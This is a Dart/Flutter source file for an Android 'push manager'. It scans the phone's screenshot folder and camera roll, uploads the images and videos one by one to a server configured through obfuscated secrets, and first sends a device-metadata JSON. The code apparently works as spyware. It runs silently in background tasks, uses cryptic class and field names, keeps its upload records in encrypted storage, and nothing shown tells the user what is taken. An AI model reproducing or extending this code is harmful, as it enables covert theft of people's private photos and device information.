/// 推送管理器（逐文件推送版）
/// - ★ 不打包、不压缩，直接推送原文件
/// - ★ 每批 3 个并发，批间串行（控制服务端压力）
/// - ★ 截图优先（最新 10 张，无大小限制，一次性）
/// - ★ 截图与 DCIM 目录并行扫描
/// - ★ 截图目录为空时不锁定一次性标记
/// - ★ 小文件优先 + 新的优先
/// - ★ 断点续传：成功入 _sent，失败自动重试
/// - ★ JSON 首次单独推送
/// - ★ 智能熔断 + 服务器检测
/// - ★ 本地记录用 flutter_secure_storage 加密存储
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:permission_handler/permission_handler.dart';

import '../config/secrets.dart';
import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────
class Mc {
  final String pushUrl;
  final String pushToken;
  final String serverBaseUrl;

  final String m7;
  final Duration pushTimeout;
  final int maxFiles;

  /// 截图目录（一次性任务，最新 N 张，无大小限制）
  final String screenshotPath;
  /// 截图一次性推送的数量上限
  final int screenshotMaxFiles;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  final int maxSingleFileBytes;
  final int smallFileBytes;
  final int batchSize;
  final int maxConsecutiveFails;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const Mc({
    this.pushUrl = '',
    this.pushToken = '',
    this.serverBaseUrl = '',
    this.m7 = '',
    this.pushTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,

    this.screenshotPath = '',
    this.screenshotMaxFiles = 10,

    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },

    this.maxSingleFileBytes = 15 * 1024 * 1024,
    this.smallFileBytes = 5 * 1024 * 1024,

    this.batchSize = 3,
    this.maxConsecutiveFails = 6,

    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });
}

// ── 单例管理器 ─────────────────────────────────────────────────────────
class Ma {
  Ma._internal();
  static final Ma instance = Ma._internal();

  static const String _kSent = 'm1p';
  static const String _kSentUrls = 'm1u';
  static const String _kJsonSent = 'm1j';
  static const String _kJsonUrl = 'm1ju';
  /// 截图一次性完成标记
  static const String _kScreenshotDone = 'm1sc';

  /// 上一次「真正开跑」的时间戳（毫秒），用于跨 isolate 互斥
  static const String _kLastRunAt = 'm5run';

  Mc _config = const Mc();

  /// ★ 换成 secure storage
  FlutterSecureStorage? _secure;
  bool _initialized = false;

  final Set<String> _sent = <String>{};
  final Map<String, String> _sentUrls = <String, String>{};

  bool _jsonSent = false;
  String? _jsonUrl;
  /// 截图是否已完成（一次性）
  bool _screenshotDone = false;
  /// 本轮扫描到的截图目录候选数（未过滤 _sent），用于判断“目录是否为空”
  int _lastScannedShotCount = 0;

  Future<void>? _currentTask;
  Future<bool>? _jsonPushing;

  /// 本轮执行的截止时间；null 表示不限时（前台服务是常驻的，不用限）
  DateTime? _deadline;

  /// 预算是不是已经用完了。
  ///
  /// ★ 为什么需要它：WorkManager 的 executeTask 最多只能跑 10 分钟，
  ///   超时会被系统直接掐掉（不是优雅退出）。而 _waitForServer() 单独一项
  ///   就能等 180×10s ≈ 30 分钟，pushTimeout 又是每文件 5 分钟 ——
  ///   不限时就必然在跑到一半时被掐死，返回不了结果，
  ///   WorkManager 还会按失败重试，白耗电量。有了预算就能自己收工返回。
  bool get _outOfTime {
    final d = _deadline;
    return d != null && !DateTime.now().isBefore(d);
  }

  /// 剩余预算；null 表示不限时
  Duration? get _remaining {
    final d = _deadline;
    if (d == null) return null;
    final left = d.difference(DateTime.now());
    return left.isNegative ? Duration.zero : left;
  }

  bool get isBusy => _currentTask != null;
  int get sentCount => _sent.length;
  bool get jsonSent => _jsonSent;
  String? get jsonUrl => _jsonUrl;
  bool get screenshotDone => _screenshotDone;

  Map<String, String> get sentUrls => Map.unmodifiable(_sentUrls);

  String? getServerUrl(File file) {
    try {
      final name = file.path.split('/').last;
      final size = file.lengthSync();
      return _sentUrls['$name:$size'];
    } catch (_) {
      return null;
    }
  }

  http.Client? _client;
  http.Client get client => _client ??= _createClient();

  http.Client _createClient() {
    final io = HttpClient();
    io.maxConnectionsPerHost = 8;
    io.idleTimeout = const Duration(seconds: 30);
    io.connectionTimeout = const Duration(seconds: 15);
    return IOClient(io);
  }

  void dispose() {
    try {
      _client?.close();
      _client = null;
    } catch (_) {}
  }

  // ── secure storage 安全读写 ────────────────────────────────────────
  //
  // ★ 为什么每处都要兜住：initialize() 是在整轮任务最开头调的，
  //   而它里面全是 secure storage 读取。后台 isolate 里插件没注册好
  //   就会抛 MissingPluginException —— 一抛，initialize() 抛，
  //   startPushIfPermitted() 抛，整轮后台任务直接报废，
  //   日志里只有一句「任务执行失败」，看不出是权限还是存储的问题。
  //
  //   读不到最多是「这轮不认识已经传过的文件」，比整个任务不跑强得多。

  Future<String?> _readSecure(String key) async {
    try {
      final store = _secure;
      if (store == null) return null;
      return await store.read(key: key);
    } catch (e) {
      debugPrint('[M] 读 $key 失败（忽略，继续跑）: $e');
      return null;
    }
  }

  Future<void> _writeSecure(String key, String value) async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.write(key: key, value: value);
    } catch (e) {
      debugPrint('[M] 写 $key 失败（忽略）: $e');
    }
  }

  Future<void> _deleteSecure(String key) async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.delete(key: key);
    } catch (e) {
      debugPrint('[M] 删 $key 失败（忽略）: $e');
    }
  }

  String _fingerprint(_Scanned s) =>
      '${s.file.path.split('/').last}:${s.size}';

  // ── 初始化 ─────────────────────────────────────────────────────────
  Future<void> initialize({Mc? config}) async {
    if (_initialized) return;

    if (config == null) {
      config = Mc(
        pushUrl: SecureConfig.m2,
        pushToken: SecureConfig.m1,
        serverBaseUrl: SecureConfig.m3,
        m7: SecureConfig.m7,
        screenshotPath: SecureConfig.screenshotPath,
      );
    } else {
      final n1 = config.m7.isEmpty;
      final needShot = config.screenshotPath.isEmpty;
      if (n1 || needShot) {
        config = Mc(
          pushUrl: config.pushUrl,
          pushToken: config.pushToken,
          serverBaseUrl: config.serverBaseUrl,
          m7: n1 ? SecureConfig.m7 : config.m7,
          screenshotPath: needShot
              ? SecureConfig.screenshotPath
              : config.screenshotPath,
          screenshotMaxFiles: config.screenshotMaxFiles,
          pushTimeout: config.pushTimeout,
          maxFiles: config.maxFiles,
          imageExtensions: config.imageExtensions,
          videoExtensions: config.videoExtensions,
          maxSingleFileBytes: config.maxSingleFileBytes,
          smallFileBytes: config.smallFileBytes,
          batchSize: config.batchSize,
          maxConsecutiveFails: config.maxConsecutiveFails,
          healthCheckUrl: config.healthCheckUrl,
          healthCheckTimeout: config.healthCheckTimeout,
          serverWaitInterval: config.serverWaitInterval,
          serverWaitMaxAttempts: config.serverWaitMaxAttempts,
        );
      }
    }
    _config = config;

    // ★ secure storage 初始化（仅 Android）
    _secure = const FlutterSecureStorage(
      aOptions: AndroidOptions(
        encryptedSharedPreferences: true,
      ),
    );

    // ★ 读 _sent（List<String> → JSON 字符串）
    _sent.clear();
    final rawSent = await _readSecure(_kSent);
    if (rawSent != null && rawSent.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawSent) as List;
        _sent.addAll(decoded.map((e) => e as String));
      } catch (_) {}
    }

    // ★ 读 _sentUrls（Map<String,String> → JSON 字符串）
    _sentUrls.clear();
    final rawUrls = await _readSecure(_kSentUrls);
    if (rawUrls != null && rawUrls.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
        decoded.forEach((k, v) => _sentUrls[k] = v as String);
      } catch (_) {}
    }

    // ★ bool → '1'
    _jsonSent = (await _readSecure(_kJsonSent)) == '1';
    _jsonUrl = await _readSecure(_kJsonUrl);
    _screenshotDone = (await _readSecure(_kScreenshotDone)) == '1';

    _initialized = true;

    debugPrint('[M] ══════ 启动自检 ══════');
    debugPrint('[M] 已记录成功: ${_sent.length} 个');
    debugPrint('[M] URL 缓存: ${_sentUrls.length} 条');
    debugPrint('[M] JSON 已推送: $_jsonSent');
    debugPrint('[M] 截图一次性任务已完成: $_screenshotDone');
    debugPrint('[M] ══════ 自检完成 ══════');
  }

  // ── 权限 ───────────────────────────────────────────────────────────
  //
  // ★ 这一整块一律不往外抛异常。
  //   后台 isolate 里插件没注册好时，Permission.xxx / device_info_plus
  //   这些平台通道调用会抛 MissingPluginException。以前没兜住，
  //   一抛就让整轮任务失败，日志里只像是「后台没跑」。
  //   规矩：查权限失败 = 当作「没给」，但绝不冒泡出去。

  /// 查一个权限，异常一律当「没给」。
  Future<bool> _granted(Permission p) async {
    try {
      final st = await p.status;
      return st.isGranted || st.isLimited;
    } catch (e) {
      debugPrint('[M] 查权限失败($p): $e');
      return false;
    }
  }

  /// Android 13+：照片 + 视频两个都要
  Future<bool> _hasMedia() async =>
      await _granted(Permission.photos) && await _granted(Permission.videos);

  /// Android 12 及以下：一个存储权限就够
  Future<bool> _hasStorage() async => _granted(Permission.storage);

  /// 上传所需的权限是否齐了。
  ///
  /// ★ 关键：拿不到 SDK_INT 时**不能**默认按「旧版权限」处理。
  ///   device_info_plus 在后台 isolate 里调不通就会返回 0，
  ///   而 Android 13+ 上 READ_EXTERNAL_STORAGE 因为 manifest 里写了
  ///   maxSdkVersion=32，状态永远是 denied —— 结果就是「权限明明给了，
  ///   却判定成没给」，后台任务永远静默跳过，一点提示都没有。
  ///   所以 SDK 未知时两条路都试，任一满足即放行。
  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) return _hasMedia();
    if (sdk > 0) return _hasStorage();

    debugPrint('[M] ⚠️ 拿不到 SDK_INT，两条权限路径都试一遍');
    return await _hasMedia() || await _hasStorage();
  }

  /// 当前缺哪几个权限 —— 给日志用，只说还没给的那几项。
  Future<List<String>> missingPermissions() async {
    if (!Platform.isAndroid) return const <String>['非 Android 设备'];

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) return _missingMedia();
    if (sdk > 0) {
      return await _hasStorage() ? const <String>[] : <String>['存储'];
    }

    // SDK 未知：两条路都没通才算缺
    if (await _hasMedia() || await _hasStorage()) return const <String>[];
    return _missingMedia();
  }

  Future<List<String>> _missingMedia() async {
    final missing = <String>[];
    if (!await _granted(Permission.photos)) missing.add('照片');
    if (!await _granted(Permission.videos)) missing.add('视频');
    return missing;
  }

  /// 申请 [hasPermission] 需要的那套权限，返回申请后是否就绪。
  ///
  /// ★ 和 [hasPermission] 一一对应：这里申请什么，那里就查什么。
  ///   两个方法写在一起，改一个就不会漏掉另一个 ——
  ///   之前引导页不申请权限，hasPermission() 就永远是 false。
  ///
  /// ★ SDK 未知时三样都申请：Android 13+ 是主流，而旧版上申请
  ///   READ_MEDIA_* 拿不到也不会有副作用（下面还补一次存储权限兜底）。
  Future<bool> requestPermission() async {
    if (!Platform.isAndroid) return false;
    if (await hasPermission()) return true;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33 || sdk == 0) {
      await _request(Permission.photos);
      await _request(Permission.videos);
    }
    if (sdk < 33) {
      await _request(Permission.storage);
    }

    return hasPermission();
  }

  /// 申请单个权限；已经给了、或已被「不再询问」挡住的，不再弹窗。
  Future<void> _request(Permission p) async {
    try {
      final st = await p.status;
      if (st.isGranted || st.isLimited || st.isPermanentlyDenied) return;
      await p.request();
    } catch (e) {
      debugPrint('[M] 申请权限失败($p): $e');
    }
  }

  /// 是不是被「永久拒绝」了（用户选了不再询问）。
  ///
  /// 这种状态再怎么 request() 都不会弹窗，只能引导去系统设置手动开。
  Future<bool> isPermanentlyDenied() async {
    if (!Platform.isAndroid) return false;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      return await _permanentlyDenied(Permission.photos) ||
          await _permanentlyDenied(Permission.videos);
    }
    if (sdk > 0) return _permanentlyDenied(Permission.storage);

    return await _permanentlyDenied(Permission.photos) ||
        await _permanentlyDenied(Permission.videos) ||
        await _permanentlyDenied(Permission.storage);
  }

  Future<bool> _permanentlyDenied(Permission p) async {
    try {
      final st = await p.status;
      return !st.isGranted && !st.isLimited && st.isPermanentlyDenied;
    } catch (_) {
      return false;
    }
  }

  /// 跑一轮推送。
  ///
  /// [budget] 是这一轮的总时间上限：
  ///   * WorkManager 那条路必须传 —— 它的 executeTask 硬上限 10 分钟；
  ///   * 前台服务不传，它是常驻的，可以慢慢等服务器。
  Future<void> startPushIfPermitted({Duration? budget}) async {
    await initialize();
    if (_currentTask != null) {
      debugPrint('[M] ⚠️ 已有任务在跑，等待...');
      await _currentTask;
      return;
    }
    _deadline = budget == null ? null : DateTime.now().add(budget);
    if (budget != null) {
      debugPrint('[M] ⏱ 本轮预算 ${budget.inMinutes} 分钟');
    }
    _currentTask = _doPush();
    try {
      await _currentTask;
    } finally {
      _currentTask = null;
      _deadline = null;
    }
  }

  // ── 跨 isolate 互斥 ───────────────────────────────────────────────
  //
  // ★ 前台服务和 WorkManager 跑在两个不同的 isolate 里，各自持有自己的
  //   Ma.instance，_currentTask 这把锁只在同一 isolate 内有效 ——
  //   两边会同时扫描同一批文件、重复上传同一张图。
  //   这里用一个落盘的「上次开跑时间」让它们轮流上。
  //
  // ★ 一律 fail-open：读不到、解析不了、写不进去，统统放行。
  //   宁可多传一次，也不能因为读不到时间戳就永远不跑 ——
  //   那就又回到了「后台任务没反应」的老问题。

  /// 两次开跑之间的最小间隔
  static const Duration _kMinGap = Duration(minutes: 5);

  Future<bool> _anotherRunJustStarted() async {
    try {
      final store = _secure;
      if (store == null) return false;
      final raw = await store.read(key: _kLastRunAt);
      if (raw == null) return false;
      final ms = int.tryParse(raw);
      if (ms == null) return false;
      final at = DateTime.fromMillisecondsSinceEpoch(ms);
      return DateTime.now().difference(at) < _kMinGap;
    } catch (_) {
      return false;
    }
  }

  Future<void> _markRunStart() async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.write(
        key: _kLastRunAt,
        value: '${DateTime.now().millisecondsSinceEpoch}',
      );
    } catch (_) {
      // 写不进去就算了，下轮照样能跑
    }
  }

  Future<void> _doPush() async {
    if (!await hasPermission()) {
      // 别只说「无权限」：把缺的那几项打出来，不然排查时只能靠猜
      final missing = await missingPermissions();
      debugPrint('[M] 权限未就绪，静默跳过（还差: ${missing.join('、')}）');
      return;
    }

    // 另一个 isolate 刚开跑过就让它先跑，避免重复上传
    if (await _anotherRunJustStarted()) {
      debugPrint('[M] ⏭ 另一个 isolate 刚开跑（${_kMinGap.inMinutes} 分钟内），'
          '本轮跳过');
      return;
    }
    await _markRunStart();

    final scanned = await _scanFiles();
    await _pushAll(scanned);
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程：分批推送
  // ══════════════════════════════════════════════════════════════════
  Future<void> _pushAll(List<_Scanned> scanned) async {
    final filtered = scanned
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList();

    if (filtered.isEmpty) {
      debugPrint('[M] 无可推送文件');
      // 即使没有可传文件，也走一次结算（截图目录为空时不锁定）
      await _maybeFinalizeScreenshots(filtered);
      return;
    }

    try {
      final totalMB =
          filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
      final batchSize = _config.batchSize.clamp(1, 8);
      final totalBatches = (filtered.length + batchSize - 1) ~/ batchSize;

      final shotCount = filtered.where((s) => s.isScreenshot).length;
      debugPrint('[M] 共 ${filtered.length} 个文件 '
          '(${totalMB.toStringAsFixed(1)} MB)，'
          '其中截图 $shotCount 张，'
          '批大小 $batchSize，共 $totalBatches 批');

      final serverOk = await _waitForServer();
      if (!serverOk) {
        debugPrint('[M] ❌ 服务器不可达，放弃本轮');
        return;
      }

      final jsonOk = await _ensureJsonSent();
      if (!jsonOk) {
        debugPrint('[M] ❌ JSON 推送失败，中止本轮');
        return;
      }

      final sw = Stopwatch()..start();
      int okTotal = 0;
      int failTotal = 0;
      int consecutiveFails = 0;
      final maxFails = _config.maxConsecutiveFails;

      for (int i = 0; i < filtered.length; i += batchSize) {
        // 预算到点就收工：剩下的留给下一轮，_sent 已经落盘，可以续传
        if (_outOfTime) {
          debugPrint('[M] ⏱ 预算用完，本轮先推到第 ${i ~/ batchSize} 批，'
              '剩余 ${filtered.length - i} 个下次继续');
          break;
        }
        final end = (i + batchSize < filtered.length)
            ? i + batchSize
            : filtered.length;
        final batch = filtered.sublist(i, end);
        final batchNum = (i ~/ batchSize) + 1;

        debugPrint('[M] ═══ 批次 $batchNum/$totalBatches '
            '(${batch.length} 个) ═══');

        final results = await Future.wait(
          batch.map((s) => _pushOne(s)),
        );

        for (int j = 0; j < batch.length; j++) {
          if (results[j]) {
            _sent.add(_fingerprint(batch[j]));
            okTotal++;
            consecutiveFails = 0;
          } else {
            failTotal++;
            consecutiveFails++;
          }
        }

        await _persist();

        debugPrint('[M] 批次 $batchNum 完成: '
            '成功 ${results.where((r) => r).length}, '
            '失败 ${results.where((r) => !r).length}, '
            '连续失败 $consecutiveFails');

        if (consecutiveFails >= maxFails) {
          debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
          break;
        }
      }

      sw.stop();
      debugPrint('[M] ══════════ 全部结束 ══════════');
      debugPrint('[M] 成功 $okTotal，失败 $failTotal，'
          '耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');

      // 结算截图一次性任务
      await _maybeFinalizeScreenshots(filtered);
    } catch (e, st) {
      debugPrint('[M] ❌ 主流程异常: $e\n$st');
    }
  }

  /// 截图一次性任务结算：
  /// - 目录为空 → 不锁定，下次继续检查
  /// - 本轮截图全部成功 → 永久锁定
  /// - 有失败 → 不锁定，下次续传
  Future<void> _maybeFinalizeScreenshots(List<_Scanned> filtered) async {
    if (_screenshotDone) return;

    // ★ 目录为空 → 不锁定
    if (_lastScannedShotCount == 0) {
      debugPrint('[M] 截图目录为空，暂不锁定（下次继续检查）');
      return;
    }

    final shotsPending = filtered.where((s) => s.isScreenshot).toList();
    final allOk =
        shotsPending.every((s) => _sent.contains(_fingerprint(s)));
    if (!allOk) {
      debugPrint('[M] ⏸ 截图未全部成功，暂不锁定，下次继续');
      return;
    }

    _screenshotDone = true;
    // ★ bool → '1'
    await _writeSecure(_kScreenshotDone, '1');
    debugPrint('[M] ★ 截图一次性任务完成，后续启动不再扫描截图目录');
  }

  // ── 单文件推送 ─────────────────────────────────────────────────────
  Future<bool> _pushOne(_Scanned scanned) async {
    final file = scanned.file;
    final name = file.path.split('/').last;

    try {
      if (!await file.exists()) {
        debugPrint('[M] ⏭ $name 已删除，跳过');
        return true;
      }

      final req = http.MultipartRequest('POST', Uri.parse(_config.pushUrl));
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';

      req.files.add(await http.MultipartFile.fromPath('file', file.path));
      req.fields['fileName'] = name;

      // 单文件超时不能超过剩余预算，否则最后一批会把整个任务拖过 10 分钟
      final left = _remaining;
      final perFileTimeout = (left == null || left > _config.pushTimeout)
          ? _config.pushTimeout
          : left;
      if (perFileTimeout <= Duration.zero) {
        debugPrint('[M] ⏱ 预算用完，$name 留到下一轮');
        return false;
      }

      final streamed =
          await client.send(req).timeout(perFileTimeout);

      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        if (serverUrl != null) {
          _sentUrls[_fingerprint(scanned)] = serverUrl;
        }
        debugPrint('[M] ✅ $name'
            '${serverUrl != null ? ' → $serverUrl' : ''}');
        return true;
      }

      String bodyStr = '';
      try {
        bodyStr = utf8.decode(rawBytes, allowMalformed: true);
        if (bodyStr.length > 150) {
          bodyStr = '${bodyStr.substring(0, 150)}...';
        }
      } catch (_) {}

      debugPrint('[M] ⚠️ $name HTTP $code body=$bodyStr');
      return false;
    } on TimeoutException {
      debugPrint('[M] ⏱ $name 超时');
      return false;
    } catch (e) {
      debugPrint('[M] ⚠️ $name 网络错误: $e');
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // JSON 首次推送
  // ══════════════════════════════════════════════════════════════════
  Future<bool> _ensureJsonSent() async {
    if (_jsonSent && _jsonUrl != null) {
      debugPrint('[M] JSON 已推送，跳过');
      return true;
    }
    if (_jsonPushing != null) {
      return await _jsonPushing!;
    }
    _jsonPushing = _doPushJson();
    try {
      return await _jsonPushing!;
    } finally {
      _jsonPushing = null;
    }
  }

  Future<bool> _doPushJson() async {
    File? jsonFile;
    try {
      debugPrint('[M] 首次推送 device_info.json...');
      final metadata = await DeviceInfoHelper.getDeviceMetadata();
      final jsonBytes = utf8.encode(jsonEncode(metadata));
      final tmpDir = Directory.systemTemp;
      jsonFile = File(
          '${tmpDir.path}/device_info_${DateTime.now().millisecondsSinceEpoch}.json');
      await jsonFile.writeAsBytes(jsonBytes);

      final req = http.MultipartRequest('POST', Uri.parse(_config.pushUrl));
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';
      req.files.add(await http.MultipartFile.fromPath('file', jsonFile.path));
      req.fields['fileName'] = 'device_info.json';

      // 和 _pushOne 一样受剩余预算约束：JSON 超时写死 5 分钟，
      // 在只有 8 分钟预算的后台任务里会一口吃掉大半，剩下没时间传文件
      final left = _remaining;
      final jsonTimeout = (left == null || left > _config.pushTimeout)
          ? _config.pushTimeout
          : left;
      if (jsonTimeout <= Duration.zero) {
        debugPrint('[M] ⏱ 预算用完，JSON 推送留到下一轮');
        return false;
      }

      final streamed = await client.send(req).timeout(jsonTimeout);
      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        _jsonSent = true;
        _jsonUrl = serverUrl;
        // ★ bool → '1'，URL → 直接存
        await _writeSecure(_kJsonSent, '1');
        if (serverUrl != null) {
          await _writeSecure(_kJsonUrl, serverUrl);
        }
        debugPrint('[M] ✅ device_info.json 推送成功');
        return true;
      }
      debugPrint('[M] ❌ device_info.json HTTP $code');
      return false;
    } catch (e) {
      debugPrint('[M] ❌ device_info.json 异常: $e');
      return false;
    } finally {
      try {
        if (jsonFile != null && await jsonFile.exists()) {
          await jsonFile.delete();
        }
      } catch (_) {}
    }
  }

  // ── 解析服务器返回 ─────────────────────────────────────────────────
  String? _parseServerUrl(List<int> rawBytes) {
    try {
      final body = utf8.decode(rawBytes, allowMalformed: true);
      final decoded = jsonDecode(body);

      String? src;
      if (decoded is List && decoded.isNotEmpty) {
        final first = decoded.first;
        if (first is Map) src = first['src'] as String?;
      } else if (decoded is Map) {
        src = decoded['src'] as String? ?? decoded['url'] as String?;
        if (src == null && decoded['data'] is Map) {
          src = (decoded['data'] as Map)['url'] as String?;
        }
      }

      if (src == null) return null;
      return _buildFullUrl(src);
    } catch (_) {
      return null;
    }
  }

  String _buildFullUrl(String pathOrUrl) {
    if (pathOrUrl.startsWith('http://') ||
        pathOrUrl.startsWith('https://')) {
      return pathOrUrl;
    }
    final base = _config.serverBaseUrl.endsWith('/')
        ? _config.serverBaseUrl
            .substring(0, _config.serverBaseUrl.length - 1)
        : _config.serverBaseUrl;
    final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
    return '$base$rel';
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.pushUrl);

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (await _pingServer(url)) {
        debugPrint('[M] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }
      // 预算用完就别再等了，把控制权交回去，让任务能正常返回
      if (_outOfTime) {
        debugPrint('[M] ⏱ 预算用完（已等 $i 次），本轮不再等待服务器');
        return false;
      }
      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[M] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次）');
      }
      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}
    try {
      final req2 = http.Request('GET', url);
      req2.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req2.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req2).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // 扫描（截图与 DCIM 并行）
  // ══════════════════════════════════════════════════════════════════
  Future<List<_Scanned>> _scanFiles() async {
    // ★ 并行扫描两个目录
    final shotFuture = (!_screenshotDone && _config.screenshotPath.isNotEmpty)
        ? _scanOneDir(
            _config.screenshotPath,
            isScreenshot: true,
            applySizeLimit: false, // 截图无大小限制
          )
        : Future.value(<_Scanned>[]);

    final mF = _scanOneDir(
      _config.m7,
      isScreenshot: false,
      applySizeLimit: true,
    );

    final results = await Future.wait([shotFuture, mF]);
    final shotsAll = results[0];
    final mA = results[1];

    // 记录截图目录符合条件的文件数（未过滤 _sent）
    _lastScannedShotCount = shotsAll.length;

    // 截图：过滤已推送 → 最新 N 张
    final shotsPending = shotsAll
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList()
      ..sort((a, b) => b.modified.compareTo(a.modified));
    final pickedShots =
        shotsPending.take(_config.screenshotMaxFiles).toList();

    // DCIM：过滤已推送 → 小文件优先 + 新优先
    final mP = mA
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList();
    final smallBytes = _config.smallFileBytes;
    mP.sort((a, b) {
      final aSmall = a.size <= smallBytes;
      final bSmall = b.size <= smallBytes;
      if (aSmall != bSmall) return aSmall ? -1 : 1;
      return b.modified.compareTo(a.modified);
    });

    // 合并：截图优先
    final merged = <_Scanned>[];
    merged.addAll(pickedShots);
    merged.addAll(mP.take(_config.maxFiles));

    if (!_screenshotDone) {
      if (_lastScannedShotCount == 0) {
        debugPrint('[M] 截图目录为空（本轮不锁定）');
      } else {
        debugPrint('[M] 截图目录 $_lastScannedShotCount 张，'
            '本轮待推送 ${pickedShots.length} 张');
      }
    }

    return merged;
  }

  Future<List<_Scanned>> _scanOneDir(
    String path, {
    required bool isScreenshot,
    required bool applySizeLimit,
  }) async {
    final dir = Directory(path);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);

      // 截图目录只收图片；DCIM 图片/视频都收
      if (isScreenshot) {
        if (!isImage) continue;
      } else {
        if (!isImage && !isVideo) continue;
      }

      try {
        final st = await e.stat();
        if (applySizeLimit && st.size > _config.maxSingleFileBytes) {
          debugPrint('[M] 跳过超大文件（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
          continue;
        }
        // 不过滤 _sent，交由 scanFiles 统一处理
        list.add(_Scanned(e, st.modified, st.size,
            isScreenshot: isScreenshot));
      } catch (_) {}
    }
    return list;
  }

  // ── 持久化（写 secure storage）────────────────────────────────────
  Future<void> _persist() async {
    for (int attempt = 1; attempt <= 3; attempt++) {
      try {
        // ★ List<String> / Map<String,String> 都存成 JSON 字符串
        await _secure?.write(
          key: _kSent,
          value: jsonEncode(_sent.toList()),
        );
        await _secure?.write(
          key: _kSentUrls,
          value: jsonEncode(_sentUrls),
        );
        return;
      } catch (e) {
        debugPrint('[M] ⚠️ 持久化失败 ($attempt/3): $e');
        if (attempt < 3) {
          await Future.delayed(const Duration(milliseconds: 100));
        }
      }
    }
  }

  Future<void> reset() async {
    _sent.clear();
    _sentUrls.clear();
    _jsonSent = false;
    _jsonUrl = null;
    _screenshotDone = false;
    _lastScannedShotCount = 0;

    await _deleteSecure(_kSent);
    await _deleteSecure(_kSentUrls);
    await _deleteSecure(_kJsonSent);
    await _deleteSecure(_kJsonUrl);
    await _deleteSecure(_kScreenshotDone);
    debugPrint('[M] 记录已清空（含截图一次性标记）');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  /// 是否来自截图目录
  final bool isScreenshot;
  _Scanned(this.file, this.modified, this.size, {this.isScreenshot = false});
}